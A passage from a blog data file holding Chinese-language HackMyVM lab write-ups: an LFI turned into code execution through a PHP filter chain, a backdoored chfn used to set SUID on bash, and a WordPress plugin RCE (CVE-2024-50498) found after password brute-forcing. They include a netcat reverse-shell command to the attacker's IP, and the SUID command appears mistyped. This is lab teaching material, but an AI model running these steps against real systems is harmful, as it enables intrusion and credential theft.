cpe:/o:linux:linux_kernel:5\nOS details: Linux 4.15 - 5.8\nNetwork Distance: 1 hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n```\n\n\u4ece `nmap` \u626b\u63cf\u7ed3\u679c\u6765\u770b\uff0c\u76ee\u6807\u673a\u5668\u5f00\u653e\u4e86 22 (SSH) \u548c 80 (HTTP) \u7aef\u53e3\u3002\u63a5\u4e0b\u6765\uff0c\u6211\u4eec\u5bf9 HTTP \u670d\u52a1\u8fdb\u884c\u8fdb\u4e00\u6b65\u7684\u76ee\u5f55\u7206\u7834\u3002\n\n## 2. Web \u670d\u52a1\u63a2\u6d4b\u4e0e PHP \u8fc7\u6ee4\u5668\u94fe\u5229\u7528\n\n\u901a\u8fc7\u4f7f\u7528 `gobuster` \u8fdb\u884c\u76ee\u5f55\u7206\u7834\uff0c\u627e\u5230\u4e86\u51e0\u4e2a\u6709\u7528\u7684\u8def\u5f84\uff1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ gobuster dir -u http://192.168.205.218 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x php,html,txt,md -b 404\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://192.168.205.218\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              php,html,txt,md\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/html                (Status: 403) [Size: 280]\n/index.html           (Status: 200) [Size: 996]\n/index.php            (Status: 200) [Size: 996]\n/.php                 (Status: 403) [Size: 280]\n/news.php             (Status: 200) [Size: 3418]\n/2021                 (Status: 200) [Size: 31875]\n/2022                 (Status: 200) [Size: 34213]\n/2023                 (Status: 200) [Size: 36067]\n/.php                 (Status: 403) [Size: 280]\n/.html                (Status: 403) [Size: 280]\n/server-status        (Status: 403) [Size: 280]\n```\n\n* `/index.php` \u548c `/index.html` \u7684\u6587\u4ef6\u5927\u5c0f\u76f8\u540c\uff0c\u6ca1\u6709\u53d1\u73b0\u6709\u7528\u7684\u4fe1\u606f\u3002\n* `/news.php` \u9875\u9762\u8981\u6c42\u8f93\u5165\u4e00\u4e2a\u90ae\u7bb1\u5730\u5740\u3002\u8f93\u5165\u4e00\u4e2a\u6709\u6548\u7684\u90ae\u7bb1\u540e\uff0c\u53ef\u4ee5\u8bbf\u95ee\u5230 `/2021`, `/2022`, `/2023` \u7b49\u65b0\u95fb\u9875\u9762\u3002\n\n\u4e0d\u8fc7\uff0c\u5728 `/news.php` \u9875\u9762\u4e2d\uff0cURL \u4e2d\u6709\u4e00\u4e2a\u5f02\u5e38\u7684\u5730\u65b9\uff0c\u63d0\u793a\u6211\u4eec\u53ef\u4ee5\u5c1d\u8bd5\u5229\u7528 **LFI**\uff08\u672c\u5730\u6587\u4ef6\u5305\u542b\uff09\u6f0f\u6d1e\u3002\n\n## 3. \u5229\u7528 PHP Filter \u8fc7\u6ee4\u5668\u94fe\n\n\u5728\u5c1d\u8bd5\u4e86 LFI \u653b\u51fb\u540e\uff0c\u6211\u53d1\u73b0\u8fd9\u4e2a\u9875\u9762\u5b9e\u9645\u4e0a\u662f\u53ef\u4ee5\u5229\u7528 **PHP \u8fc7\u6ee4\u5668\u94fe** \u6765\u6267\u884c\u547d\u4ee4\u3002\u7ecf\u8fc7\u4e00\u4e9b\u601d\u8003\u540e\uff0c\u6211\u51b3\u5b9a\u4f7f\u7528 [PHP Filter Chain Generator](https://github.com/synacktiv/php_filter_chain_generator) \u6765\u751f\u6210\u4e00\u4e2a\u8fc7\u6ee4\u5668\u94fe\u3002\u8be5\u5de5\u5177\u5e2e\u52a9\u6211\u4eec\u6784\u5efa\u53ef\u4ee5\u901a\u8fc7 `php://filter` \u7ed5\u8fc7 PHP \u7684\u5b89\u5168\u9650\u5236\u5e76\u6267\u884c\u4efb\u610f\u547d\u4ee4\u7684\u94fe\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ git clone https://github.com/synacktiv/php_filter_chain_generator.git\n\u6b63\u514b\u9686\u5230 'php_filter_chain_generator'...\n...\n```\n\n\u7136\u540e\uff0c\u6211\u4f7f\u7528\u751f\u6210\u7684\u94fe\u6761\u6765\u83b7\u53d6\u53cd\u5411 shell\uff1a\n\n```bash\nhttp://192.168.205.218/news.php?year=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&0=nc -e /bin/bash 192.168.205.141 8888\n```\n\n## 4. \u83b7\u5f97\u7a33\u5b9a\u7684 Shell\n\n\u83b7\u53d6\u53cd\u5411 shell \u540e\uff0c\u901a\u8fc7\u4ee5\u4e0b\u547d\u4ee4\u83b7\u5f97\u7a33\u5b9a\u7684\u4ea4\u4e92\u5f0f TTY shell\uff1a\n\n```bash\nscript /dev/null -c bash  \nctrl+z  \nstty raw -echo; fg  \nreset xterm  \nexport TERM=xterm  \necho $SHELL  \nexport SHELL=/bin/bash  \nstty rows 59 cols 236\n```\n\n## 5. \u63d0\u6743\n\n\u5728\u7cfb\u7edf\u4e2d\u6ca1\u6709\u53d1\u73b0\u660e\u663e\u7684\u63d0\u6743\u70b9\uff0c\u4f46\u901a\u8fc7 `dpkg -V` \u547d\u4ee4\u67e5\u770b\u7cfb\u7edf\u6587\u4ef6\u7684\u5b8c\u6574\u6027\u3002\n\n```bash\nbash-5.2$ dpkg -V\nmissing   c /etc/apache2/sites-available/000-default.conf\nmissing   c /etc/apache2/sites-available/default-ssl.conf\n??5?????? c /etc/grub.d/10_linux\n??5??????   /usr/bin/chfn\n```\n\n\u53d1\u73b0 `/usr/bin/chfn` \u88ab\u4fee\u6539\uff0c\u4e14\u8be5\u6587\u4ef6\u53ef\u80fd\u5b58\u5728\u63d0\u6743\u6f0f\u6d1e\u3002\u6211\u4eec\u5c06\u5b83\u62d6\u5165ida\u5206\u6790\u4e00\u4e0b\uff0c\u6211\u4eec\u4f1a\u53d1\u73b0\u5982\u4e0b\u547d\u4ee4\u5b57\u7b26\u4e32\uff1a\n\n![image](https://github.com/user-attachments/assets/fe1370ad-f488-4462-a38d-69b1a5acdb3b)\n\u8fd9\u6bb5\u5b57\u7b26\u4e32\u8868\u793a\u7684\u662f\uff1a\n\n```bash\nnohup /tmp/system </dev/null >/dev/null 2>&1 &\n```\n\n`nohup`\uff1anohup\u662f\u4e00\u4e2aPOSIX\u547d\u4ee4\uff0c\u610f\u601d\u662f\u201c\u4e0d\u6302\u65ad\u201d\n`/tmp/system`\uff1a\u6076\u610f\u811a\u672c\n\n\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 `chfn` \u547d\u4ee4\u4fee\u6539 `/bin/bash` ,\u5c06\u5b83\u8bbe\u6210\u6211\u4eec\u53ef\u4ee5\u8fd0\u884c\u7684\u6743\u9650\uff0c\u4ece\u800c\u83b7\u5f97 root \u6743\u9650\u3002\n\n```bash\nbash-5.2$ vi system\nbash-5.2$ cat system \nbash u+s /bin/bash\nbash-5.2$ /usr/bin/chfn\nChanging the user information for root\nEnter the new value, or press ENTER for the default\n        Full Name [root]: \n        Room Number []: \n        Work Phone []: \n        Home Phone []: \n        Other []: \nbash-5.2$ ls -la /bin/bash\n-rwsr-sr-x 1 root root 1265648 Apr 23  2023 /bin/bash\nbash-5.2$ bash -p\nbash-5.2# id\nuid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)\n```\n\n\u901a\u8fc7\u6b64\u65b9\u5f0f\uff0c\u6210\u529f\u83b7\u5f97\u4e86 root \u6743\u9650\u3002sentence", "top": 0, "createdAt": 1751016757, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P93": {"htmlDir": "docs/post/hmv_buster.html", "labels": ["HackMyVM"], "postTitle": "hmv_buster", "postUrl": "post/hmv_buster.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/93", "commentNum": 0, "wordCount": 21737, "description": "# hmv_buster\n\n# 0.\u7b80\u4ecb\n\n**\u9776\u673a**\uff1a[hackmyvm - buster](https://hackmyvm.eu/machines/machine.php?vm=buster)\n**\u96be\u5ea6**\uff1a\u7eff\u8272\n**\u76ee\u6807 IP**\uff1a192.168.205.142\n**\u672c\u673a IP**\uff1a192.168.205.141\n\n# 1.\u626b\u63cf\n\n`nmap`\u8d77\u624b\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.142\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-01-15 20:11 CST\nNmap scan report for 192.168.205.142\nHost is up (0.00022s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:09:D8:74 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 1.40 seconds\n\n```\n\n\u5148\u770b**80\u7aef\u53e3**\uff0c**22\u7aef\u53e3**\u5019\u8865\n\n# 2.\u8e29\u70b9\n\n![image](https://github.com/user-attachments/assets/9eb492e1-d1d8-4170-bb5f-990d1792265b)\n\u662f\u4e2a**wordPress\uff0c**  \u62ff**wpscan**\u626b\u63cf\u4e00\u4e0b\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ wpscan --url http://192.168.205.142/ -e vp,u --api-token xxx   #api-token\u6ce8\u518cwpscan\u5b98\u7f51\u83b7\u53d6\n_______________________________________________________________\n         __          _______   _____\n         \\ \\        / /  __ \\ / ____|\n          \\ \\  /\\  / /| |__) | (___   ___  __ _ _ __ \u00ae\n           \\ \\/  \\/ / |  ___/ \\___ \\ / __|/ _` | '_ \\\n            \\  /\\  /  | |     ____) | (__| (_| | | | |\n             \\/  \\/   |_|    |_____/ \\___|\\__,_|_| |_|\n\n         WordPress Security Scanner by the WPScan Team\n                         Version 3.8.27\n       Sponsored by Automattic - https://automattic.com/\n       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart\n_______________________________________________________________\n\n[+] URL: http://192.168.205.142/ [192.168.205.142]\n[+] Started: Wed Jan 15 20:13:50 2025\n\nInteresting Finding(s):\n\n[+] Headers\n | Interesting Entry: Server: nginx/1.14.2\n | Found By: Headers (Passive Detection)\n | Confidence: 100%\n\n[+] robots.txt found: http://192.168.205.142/robots.txt\n | Interesting Entries:\n |  - /wp-admin/\n |  - /wp-admin/admin-ajax.php\n | Found By: Robots Txt (Aggressive Detection)\n | Confidence: 100%\n\n[+] XML-RPC seems to be enabled: http://192.168.205.142/xmlrpc.php\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 100%\n | References:\n |  - http://codex.wordpress.org/XML-RPC_Pingback_API\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/\n |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/\n\n[+] WordPress readme found: http://192.168.205.142/readme.html\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 100%\n\n[+] The external WP-Cron seems to be enabled: http://192.168.205.142/wp-cron.php\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 60%\n | References:\n |  - https://www.iplocation.net/defend-wordpress-from-ddos\n |  - https://github.com/wpscanteam/wpscan/issues/1299\n\n[+] WordPress version 6.7.1 identified (Latest, released on 2024-11-21).\n | Found By: Meta Generator (Passive Detection)\n |  - http://192.168.205.142/, Match: 'WordPress 6.7.1'\n | Confirmed By: Rss Generator (Aggressive Detection)\n |  - http://192.168.205.142/feed/, <generator>https://wordpress.org/?v=6.7.1</generator>\n |  - http://192.168.205.142/comments/feed/, <generator>https://wordpress.org/?v=6.7.1</generator>\n\n[i] The main theme could not be detected.\n\n[+] Enumerating Vulnerable Plugins (via Passive Methods)\n\n[i] No plugins Found.\n\n[+] Enumerating Users (via Passive and Aggressive Methods)\n Brute Forcing Author IDs - Time: 00:00:00 <========================================================> (10 / 10) 100.00% Time: 00:00:00\n\n[i] User(s) Identified:\n\n[+] ta0\n | Found By: Wp Json Api (Aggressive Detection)\n |  - http://192.168.205.142/wp-json/wp/v2/users/?per_page=100&page=1\n | Confirmed By:\n |  Rss Generator (Aggressive Detection)\n |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)\n |  Login Error Messages (Aggressive Detection)\n\n[+] welcome\n | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)\n | Confirmed By: Login Error Messages (Aggressive Detection)\n\n[+] WPScan DB API OK\n | Plan: free\n | Requests Done (during the scan): 1\n | Requests Remaining: 18\n\n[+] Finished: Wed Jan 15 20:13:57 2025\n[+] Requests Done: 53\n[+] Cached Requests: 6\n[+] Data Sent: 13.267 KB\n[+] Data Received: 413.04 KB\n[+] Memory used: 229.277 MB\n[+] Elapsed time: 00:00:07\n                                                     \n```\n\n\u4e3b\u8981\u7684\u4fe1\u606f\u6709`WordPress 6.7.1`\u548c\u4e24\u4e2a\u7528\u6237\u540d`ta0`\u3001`welcome`\uff0c\u4f46\u662f`WordPress 6.7.1`\u6ca1\u6709\u6f0f\u6d1e\uff0c\u53ea\u53ef\u4ee5\u7206\u7834\u5bc6\u7801\u4e86\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ wpscan -U ta0,welcome -P /usr/share/wordlists/q5000.txt --url http://192.168.205.142/             \n_______________________________________________________________\n         __          _______   _____\n         \\ \\        / /  __ \\ / ____|\n          \\ \\  /\\  / /| |__) | (___   ___  __ _ _ __ \u00ae\n           \\ \\/  \\/ / |  ___/ \\___ \\ / __|/ _` | '_ \\\n            \\  /\\  /  | |     ____) | (__| (_| | | | |\n             \\/  \\/   |_|    |_____/ \\___|\\__,_|_| |_|\n\n         WordPress Security Scanner by the WPScan Team\n                         Version 3.8.27\n       Sponsored by Automattic - https://automattic.com/\n       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart\n_______________________________________________________________\n\n\uff08\u7701\u7565\uff09\n\n[+] Performing password attack on Xmlrpc against 2 user/s\nTrying ta0 / speaker Time: 00:01:37 <=========================================================> (10000 / 10000) 100.00% Time: 00:01:37\n\n[i] No Valid Passwords Found.\n\n[!] No WPScan API Token given, as a result vulnerability data has not been output.\n[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register\n\n[+] Finished: Wed Jan 15 20:18:29 2025\n[+] Requests Done: 10142\n[+] Cached Requests: 34\n[+] Data Sent: 5.147 MB\n[+] Data Received: 5.559 MB\n[+] Memory used: 278.031 MB\n[+] Elapsed time: 00:01:40\n\n```\n\n\u7206\u7834\u4e86\u524d5000\u884c`rockyou.txt`\u90fd\u6ca1\u6709\u7ed3\u679c\uff0c\u6ca1\u6709\u5fc5\u8981\u7206\u7834\u4e86\uff0c\u6839\u636e\u73b0\u5728\u83b7\u5f97\u7684\u4fe1\u606f\u65e0\u6cd5\u5224\u65ad\u51fa\u653b\u51fb\u9762\uff0c\u4f46\u662f`WordPress`\u9776\u673a\u8fd8\u6709\u4e00\u4e2a\u653b\u51fb\u70b9\u2014\u2014**\u63d2\u4ef6**\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ wpscan --url http://192.168.205.142/ -e ap --plugins-detection aggressive --api-token xxx   #api-token\u6ce8\u518cwpscan\u5b98\u7f51\u83b7\u53d6\n_______________________________________________________________\n         __          _______   _____\n         \\ \\        / /  __ \\ / ____|\n          \\ \\  /\\  / /| |__) | (___   ___  __ _ _ __ \u00ae\n           \\ \\/  \\/ / |  ___/ \\___ \\ / __|/ _` | '_ \\\n            \\  /\\  /  | |     ____) | (__| (_| | | | |\n             \\/  \\/   |_|    |_____/ \\___|\\__,_|_| |_|\n\n         WordPress Security Scanner by the WPScan Team\n                         Version 3.8.27\n       Sponsored by Automattic - https://automattic.com/\n       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart\n_______________________________________________________________\n\uff08\u7701\u7565\uff09\n\n[+] Enumerating All Plugins (via Aggressive Methods)\n Checking Known Locations - Time: 00:17:12 <================================================> (108550 / 108550) 100.00% Time: 00:17:12\n[+] Checking Plugin Versions (via Passive and Aggressive Methods)\n\n[i] Plugin(s) Identified:\n\n[+] akismet\n | Location: http://192.168.205.142/wp-content/plugins/akismet/\n | Latest Version: 5.3.5 (up to date)\n | Last Updated: 2024-11-19T02:02:00.000Z\n | Readme: http://192.168.205.142/wp-content/plugins/akismet/readme.txt\n |\n | Found By: Known Locations (Aggressive Detection)\n |  - http://192.168.205.142/wp-content/plugins/akismet/, status: 200\n |\n | Version: 5.3.5 (100% confidence)\n | Found By: Readme - Stable Tag (Aggressive Detection)\n |  - http://192.168.205.142/wp-content/plugins/akismet/readme.txt\n | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)\n |  - http://192.168.205.142/wp-content/plugins/akismet/readme.txt\n\n[+] feed\n | Location: http://192.168.205.142/wp-content/plugins/feed/\n |\n | Found By: Known Locations (Aggressive Detection)\n |  - http://192.168.205.142/wp-content/plugins/feed/, status: 200\n |\n | The version could not be determined.\n\n[+] wp-query-console\n | Location: http://192.168.205.142/wp-content/plugins/wp-query-console/\n | Latest Version: 1.0 (up to date)\n | Last Updated: 2018-03-16T16:03:00.000Z\n | Readme: http://192.168.205.142/wp-content/plugins/wp-query-console/README.txt\n |\n | Found By: Known Locations (Aggressive Detection)\n |  - http://192.168.205.142/wp-content/plugins/wp-query-console/, status: 403\n |\n | [!] 1 vulnerability identified:\n |\n | [!] Title: WP Query Console <= 1.0 - Unauthenticated Remote Code Execution\n |     References:\n |      - https://wpscan.com/vulnerability/f911568d-5f79-49b7-8ce4-fa0da3183214\n |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-50498\n |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/ae07ca12-e827-43f9-8cbb-275b9abbd4c3\n |\n | Version: 1.0 (80% confidence)\n | Found By: Readme - Stable Tag (Aggressive Detection)\n |  - http://192.168.205.142/wp-content/plugins/wp-query-console/README.txt\n\n[+] WPScan DB API OK\n | Plan: free\n | Requests Done (during the scan): 3\n | Requests Remaining: 15\n\n[+] Finished: Wed Jan 15 20:39:16 2025\n[+] Requests Done: 108575\n[+] Cached Requests: 44\n[+] Data Sent: 29.36 MB\n[+] Data Received: 32.766 MB\n[+] Memory used: 479.719 MB\n[+] Elapsed time: 00:17:25\n\n```\n\n`wp-query-console`\u6709\u6f0f\u6d1e\uff0c\u6211\u4eec\u53bb\u641c\u7d22\u4e00\u4e0b\u6709\u6ca1\u6709\u5229\u7528\u65b9\u6848\u3002\u53ef\u4ee5\u627e\u5230\u4e00\u7bc7\u8fd9\u6837\u7684\u6587\u7ae0[RandomRobbieBF/CVE-2024-50498](https://github.com/RandomRobbieBF/CVE-2024-50498)\n\n![image](https://github.com/user-attachments/assets/72a55300-d8e3-4b5d-b895-5a370c1fd640)\n\n\u6839\u636e\u63d0\u793a\u5229\u7528\u4e00\u4e0b\n\n![image](https://github.com/user-attachments/assets/3a1b94f1-b121-441a-a33c-d6db585b5507)\n\n\u6210\u529f\u5229\u7528\uff0c\u5c1d\u8bd5\u770b\u80fd\u4e0d\u80fd\u5f39shell\n\n![image](https://github.com/user-attachments/assets/74d4c4b9-7dc8-4f1b-9bd6-669273dfc52f)\n\n\u663e\u793a\u67e5\u8be2\u53c2\u6570\u5931\u8d25\uff0c\u6211\u4eec\u5c1d\u8bd5ping kali\uff0c\u65e0\u679c\uff0c\u5e94\u8be5\u662fban\u4e86\u51fd\u6570\uff0c\u6211\u4eec\u641c\u7d22\u4e00\u4e0b\n\n![image](https://github.com/user-attachments/assets/d355dc93-3a9f-436e-a874-7b36e93f57b5)\n\n\u786e\u5b9e\u88abban\u4e86\uff0c\u6211\u4eec\u5c1d\u8bd5\u4e00\u4e0b\u4f7f\u7528\u672a\u88abban\u7684\u51fd\u6570\n\n![image](https://github.com/user-attachments/assets/82858cb3-8662-44af-b9aa-f5f02210d1ad)\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ sudo tcpdump -A -n icmp  \n[sudo] kali \u7684\u5bc6\u7801\uff1a\ntcpdump: verbose output suppressed, use -v[v]... for full protocol decode\nlistening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes\n20:52:15.340738 IP 192.168.205.142 > 192.168.205.141: ICMP echo request, id 1113, seq 1, length 64\nE..T..@.@.)..............Y..e..g....j....................... !'#$%&'()*+,-./01234567\n20:52:15.340759 IP 192.168.205.141 > 192.168.205.142: ICMP echo reply, id 1113, seq 1, length 64\nE..T\nO..@.S..............Y..e..g....j....................... !'#$%&'()*+,-./01234567\n20:52:16.353977 IP 192.168.205.142 > 192.168.205.141: ICMP echo request, id 1113, seq 2, length 64\nE..T.M@.@.(...........4Y.Y..f..g.....b...................... !'#$%&'()*+,-./01234567\n20:52:16.353997 IP 192.168.205.141 > 192.168.205.142: ICMP echo reply, id 1113, seq 2, length 64\nE..T\nT..@.S...........<Y.Y..f..g.....b...................... !'#$%&'()*+,-./01234567\n\n```\n\n\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u6211\u4eec\u7684ping\u547d\u4ee4\u88ab\u6267\u884c\u4e86\uff0c\u6211\u4eec\u8fdb\u884c\u5f39shell\n\n![image](https://github.com/user-attachments/assets/8effbcee-22c7-4b8d-9c2d-e1f2d8b65842)\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ nc -lvnp 8888                                  \nlistening on [any] 8888 ...\nconnect to [192.168.205.141] from (UNKNOWN) [192.168.205.142] 58804\nid\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n```\n\n# 3. \u83b7\u5f97\u7a33\u5b9a\u7684 Shell\n\n\u83b7\u53d6**\u53cd\u5411 shell** \u540e\uff0c\u901a\u8fc7\u4ee5\u4e0b\u547d\u4ee4\u83b7\u5f97\u7a33\u5b9a\u7684**\u4ea4\u4e92\u5f0f** **TTY shell**\uff1a\n\n```bash\nscript /dev/null -c bash  \nctrl+z  \nstty raw -echo; fg  \nreset xterm  \nexport TERM=xterm  \necho $SHELL  \nexport SHELL=/bin/bash  \nstty rows 59 cols 236\n```\n\n# 4.\u63d0\u6743\n\n```bash\nwww-data@listen:~/html/wordpress$ cd /home/\nwww-data@listen:/home$ ls -la\ntotal 12\ndrwxr-xr-x  3 root    root    4096 Jan  7 23:16 .\ndrwxr-xr-x 18 root    root    4096 Jan  7 21:50 ..\ndrwx------  2 welcome welcome 4096 Jan  7 23:18 welcome\n```\n\n\u5f53\u770b\u5230\u8fd9\u4e2a**id**\u7684\u65f6\u5019\u6211\u5c31\u77e5\u9053\u8981\u53bb\u67e5\u770b**mysql**\u4e86\uff0c\u56e0\u4e3a\u8fd9\u4e2a\u540d\u5b57\u548c\u7206\u7834\u51fa\u6765\u7684\u540d\u5b57\u4e00\u6837\uff0c\u6211\u4eec\u5148\u53bb\u627e\u4e00\u4e0b**mysql**\u7684\u5bc6\u7801\n\n```bash\nwww-data@listen:/home$ cd /var/www/html/wordpress/\nwww-data@listen:~/html/wordpress$ ls -la\ntotal 248\ndrwxr-xr-x  5 www-data www-data  4096 Jan  8 02:25 .\ndrwxr-xr-x  3 root     root      4096 Jan  7 23:52 ..\n-rwxr-xr-x  1 www-data www-data   405 Jan  8 02:25 index.php\n-rwxr-xr-x  1 www-data www-data 19915 Dec 31  2023 license.txt\n-rwxr-xr-x  1 www-data www-data  7409 Jun 18  2024 readme.html\n-rw-r--r--  1 root     root       684 Jan  8 02:25 update_url.php\n-rwxr-xr-x  1 www-data www-data  7387 Feb 13  2024 wp-activate.php\ndrwxr-xr-x  9 www-data www-data  4096 Nov 21 09:07 wp-admin\n-rwxr-xr-x  1 www-data www-data   351 Feb  6  2020 wp-blog-header.php\n-rwxr-xr-x  1 www-data www-data  2323 Jun 14  2023 wp-comments-post.php\n-rwxr-xr-x  1 www-data www-data  3336 Oct 15 11:24 wp-config-sample.php\n-rw-rw-rw-  1 www-data www-data  3620 Jan  8 02:25 wp-config.php\ndrwxr-xr-x  6 www-data www-data  4096 Jan  8 02:20 wp-content\n-rwxr-xr-x  1 www-data www-data  5617 Aug  2 15:40 wp-cron.php\ndrwxr-xr-x 30 www-data www-data 12288 Nov 21 09:07 wp-includes\n-rwxr-xr-x  1 www-data www-data  2502 Nov 26  2022 wp-links-opml.php\n-rwxr-xr-x  1 www-data www-data  3937 Mar 11  2024 wp-load.php\n-rwxr-xr-x  1 www-data www-data 51367 Sep 30 15:12 wp-login.php\n-rwxr-xr-x  1 www-data www-data  8543 Sep 18 18:37 wp-mail.php\n-rwxr-xr-x  1 www-data www-data 29032 Sep 30 13:08 wp-settings.php\n-rwxr-xr-x  1 www-data www-data 34385 Jun 19  2023 wp-signup.php\n-rwxr-xr-x  1 www-data www-data  5102 Oct 18 11:56 wp-trackback.php\n-rwxr-xr-x  1 www-data www-data  3246 Mar  2  2024 xmlrpc.php\nwww-data@listen:~/html/wordpress$ cat wp-config.php\n<?php\n/**\n * The base configuration for WordPress\n *\n * The wp-config.php creation script uses this file during the installation.\n * You don't have to use the website, you can copy this file to 'wp-config.php'\n * and fill in the values.\n *\n * This file contains the following configurations:\n *\n * * Database settings\n * * Secret keys\n * * Database table prefix\n * * ABSPATH\n *\n * @link https://developer.wordpress.org/advanced-administration/wordpress/wp-config/\n *\n * @package WordPress\n */\n\n// ** Database settings - You can get this info from your web host ** //\n/** The name of the database for WordPress */\ndefine( 'DB_NAME', 'wordpress' );\n\n/** Database username */\ndefine( 'DB_USER', 'll104567' );\n\n/** Database password 